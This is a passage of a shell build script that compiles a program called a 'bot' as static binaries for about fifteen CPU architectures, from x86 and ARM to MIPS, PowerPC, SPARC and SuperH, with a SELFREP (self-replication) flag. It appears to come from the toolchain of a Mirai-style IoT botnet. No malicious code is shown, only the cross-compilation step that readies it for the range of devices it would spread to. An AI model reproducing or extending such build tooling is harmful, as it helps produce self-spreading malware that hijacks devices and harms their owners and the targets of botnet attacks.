...
echo 'for the love of god dont close this its fucking compiling. thanks'
compile_bot i486 i486 "-static -DSELFREP -DSELFREP"
compile_bot i586 x86 "-static -DSELFREP"
compile_bot i686 i686 "-static -DSELFREP "
compile_bot x86_64 x86_64 "-static -DSELFREP"
compile_bot mips mips "-static -DSELFREP "
compile_bot mipsel mpsl "-static -DSELFREP "
compile_bot armv4l arm4 "-static -DSELFREP "
compile_bot armv5l arm5 "-static -DSELFREP "
compile_bot armv6l arm6 "-static -DSELFREP"
compile_armv7l armv7l arm7 "-static -DSELFREP"
compile_bot powerpc ppc "-static -DSELFREP"
compile_bot sparc spc "-static -DSELFREP"
compile_bot m68k m68k "-static -DSELFREP"
compile_bot sh4 sh4 "-static -DSELFREP"
arc_compile arc arc "-static -DSELFREP"
